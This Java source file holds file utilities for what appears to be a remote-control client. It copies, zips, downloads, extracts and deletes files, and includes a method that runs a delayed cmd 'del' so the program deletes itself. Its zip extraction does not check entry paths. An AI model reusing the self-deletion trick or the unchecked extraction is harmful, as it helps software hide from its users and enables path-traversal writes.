package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:20
 */

import br.com.introcdc.connect.client.ConnectClient;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.text.Normalizer;
import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeFormatterBuilder;
import java.time.format.SignStyle;
import java.time.temporal.ChronoField;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class FileComponents {

    // Navigation Variables
    public static String FOLDER = System.getProperty("user.home");
    public static boolean ZIP_LOCAL = false;

    // Time Formatter
    public static DateTimeFormatter TIME_FORMATTER = new DateTimeFormatterBuilder().appendValue(ChronoField.DAY_OF_MONTH, 2)
            .appendLiteral('/').appendValue(ChronoField.MONTH_OF_YEAR, 2).appendLiteral('/')
            .appendValue(ChronoField.YEAR, 4, 10, SignStyle.EXCEEDS_PAD).appendLiteral(" - ")
            .appendValue(ChronoField.HOUR_OF_DAY, 2).appendLiteral(':').appendValue(ChronoField.MINUTE_OF_HOUR, 2)
            .appendLiteral(':').appendValue(ChronoField.SECOND_OF_MINUTE, 2).toFormatter();

    // File Methods
    public static void copy(File sourceLocation, File targetLocation) {
        if (sourceLocation.isDirectory()) {
            copyDirectory(sourceLocation, targetLocation);
        } else {
            copyFile(sourceLocation, targetLocation);
        }
    }

    public static void copyDirectory(File source, File target) {
        if (!target.exists()) {
            target.mkdirs();
        }
        for (String file : source.list()) {
            copy(new File(source, file), new File(target, file));
        }
    }

    public static void copyFile(File source, File target) {
        try {
            try (InputStream in = new BufferedInputStream(new FileInputStream(source)); OutputStream out = new BufferedOutputStream(new FileOutputStream(target))) {
                byte[] buf = new byte[1024];
                int length;
                while ((length = in.read(buf)) > 0) {
                    out.write(buf, 0, length);
                }
            }
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao copiar o arquivo " + source.getAbsolutePath() + " para " + target.getAbsolutePath() + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static void readFolder(File folder, Map<String, String> files, String base, String fullBase) {
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                readFolder(file, files, base + "/" + file.getName(), fullBase);
            } else {
                files.put(fullBase + base + "/" + file.getName(), base + "/" + file.getName());
            }
        }
    }

    public static void createZip(File folder, File destiny, String fullBase) {
        Map<String, String> files = new HashMap<>();
        readFolder(folder, files, folder.getName(), fullBase);
        createZip(files, destiny);
    }

    public static void createZipFile(File file) {
        Map<String, String> files = new HashMap<>();
        files.put(file.getName(), file.getName());
        createZip(files, new File(FOLDER, file.getName() + ".zip"));
    }

    public static void createZip(Map<String, String> files, File destiny) {
        try {
            if (!destiny.exists()) {
                destiny.createNewFile();
            }
            int BUFFER = 2048;
            BufferedInputStream origin = null;
            FileOutputStream dest = new FileOutputStream(destiny);
            ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));
            for (String file : files.keySet()) {
                byte[] data = new byte[BUFFER];
                FileInputStream fileInput = new FileInputStream(file);
                origin = new BufferedInputStream(fileInput, BUFFER);
                ZipEntry entry = new ZipEntry(files.get(file));
                out.putNextEntry(entry);
                int count;
                while ((count = origin.read(data, 0, BUFFER)) != -1) {
                    out.write(data, 0, count);
                    out.flush();
                }
            }
            origin.close();
            out.flush();
            out.close();
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao criar o zip para " + destiny.getAbsolutePath() + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static File newFile(String input) {
        if (input.startsWith("/")) {
            return new File(input.substring(1));
        }
        return new File(FOLDER, input);
    }

    public static File file(String input) {
        if (input.startsWith("i:")) {
            try {
                int index = Integer.parseInt(input.substring(2));
                return new File(FOLDER).listFiles()[index];
            } catch (Exception ignored) {
            }
        }
        File file = new File(FOLDER, input);
        if (file.exists()) {
            return file;
        }
        return new File(input);
    }

    public static void deleteFile(File file) {
        if (file.exists()) {
            deleteFile(file.toPath());
        }
    }

    public static void deleteFile(Path path) {
        if (path == null) {
            return;
        }
        try {
            Files.walkFileTree(path, new SimpleFileVisitor<Path>() {

                private FileVisitResult handleException(IOException exception) {
                    return FileVisitResult.TERMINATE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exception) throws IOException {
                    if (exception != null) {
                        return handleException(exception);
                    }
                    Files.delete(dir);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exception) {
                    return handleException(exception);
                }
            });
        } catch (Exception exception) {
            if (path.getFileName().toFile().getName().equalsIgnoreCase(InstallComponents.LOCAL_FILE)) {
                return;
            }
            ConnectClient.msg("Ocorreu um erro ao deletar o arquivo " + path.getFileName() + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static boolean downloadFile(String URL, File destiny) {
        try {
            if (!destiny.exists()) {
                if (destiny.getParentFile() != null) {
                    destiny.getParentFile().mkdirs();
                }
                destiny.createNewFile();
            }
            URLConnection connection = new URL(URL).openConnection();
            connection.addRequestProperty("User-Agent", "IntroCDC");
            if (destiny.exists() && destiny.length() == connection.getContentLengthLong()) {
                return false;
            }
            try (BufferedInputStream in = new BufferedInputStream(connection.getInputStream()); FileOutputStream fout = new FileOutputStream(destiny)) {
                byte[] data = new byte[1024];
                int count;
                while ((count = in.read(data, 0, 1024)) != -1) {
                    fout.write(data, 0, count);
                }
                fout.flush();
            }
            return true;
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao baixar o arquivo " + URL + " para " + destiny.getAbsolutePath() + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
        return false;
    }

    public static void extractZip(File fsrc, File fdest) {
        try {
            int BUFFER = (int) fsrc.length();
            ZipFile zip = new ZipFile(fsrc);
            Enumeration<?> zipFileEntries = zip.entries();
            while (zipFileEntries.hasMoreElements()) {
                ZipEntry entry = (ZipEntry) zipFileEntries.nextElement();
                String currentEntry = entry.getName();
                File destFile = new File(fdest, currentEntry);
                File destinationParent = destFile.getParentFile();
                if (destinationParent != null) {
                    destinationParent.mkdirs();
                }
                if (!entry.isDirectory()) {
                    BufferedInputStream is = new BufferedInputStream(zip.getInputStream(entry));
                    int currentByte;
                    byte[] data = new byte[BUFFER];
                    FileOutputStream fos = new FileOutputStream(destFile);
                    BufferedOutputStream dest = new BufferedOutputStream(fos, BUFFER);
                    while ((currentByte = is.read(data, 0, BUFFER)) != -1) {
                        dest.write(data, 0, currentByte);
                    }
                    dest.flush();
                    dest.close();
                    is.close();
                }
            }
            zip.close();
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao extrair o arquivo " + fsrc.getAbsolutePath() + " para " + fdest.getAbsolutePath() + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static String removeCharacters(String string) {
        if (string == null) {
            return null;
        }
        return Normalizer.normalize(string, Normalizer.Form.NFD)
                .replaceAll("[^\\p{ASCII}]", "")
                .replaceAll("[^a-zA-Z0-9\\s.,]", "");
    }

    public static String getFileName() {
        try {
            String jarPath = ConnectClient.class.getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .toURI()
                    .getPath();

            return jarPath.substring(jarPath.lastIndexOf("/") + 1);
        } catch (Exception ignored) {
        }
        return "Connect.jar";
    }

    public static void tempDeleteOwnFile() {
        try {
            String input = "cmd /c ping -n 2 127.0.0.1 >nul && del \"" + getFileName() + "\"";
            File directory = new File(System.getProperty("user.dir"));
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command(input.split(" "));
            processBuilder.directory(directory);
            processBuilder.start();
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao iniciar o temporizador de deletar o programa (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static boolean isSpecialCharacter(char c) {
        return "!@#$%^&*()_+{}|:\"<>?~".indexOf(c) >= 0;
    }

    public static String toDate(long number) {
        return TIME_FORMATTER.format(Instant.ofEpochMilli(number).atZone(ZoneId.systemDefault()).toLocalDateTime());
    }

    public static String toTime(long totalTime) {
        long years = totalTime / 32140800;
        long months = totalTime % 32140800 / 2678400;
        long days = totalTime % 2678400 / 86400;
        long hours = totalTime % 86400 / 3600;
        long minutes = totalTime % 3600 / 60;
        long seconds = totalTime % 60;
        if (totalTime > 0) {
            return (years > 0 ? placeZero(years) + "A " : "") +
                    (months > 0 ? placeZero(months) + "M " : "") +
                    (days > 0 ? placeZero(days) + "d " : "") +
                    (hours > 0 ? placeZero(hours) + "h " : "") +
                    (minutes > 0 ? placeZero(minutes) + "m " : "") +
                    (seconds > 0 ? placeZero(seconds) + "s " : "");
        }
        return "0s";
    }

    public static String placeZero(long number) {
        return number >= 10 ? Long.toString(number) : String.format("0%s", number + "");
    }

}
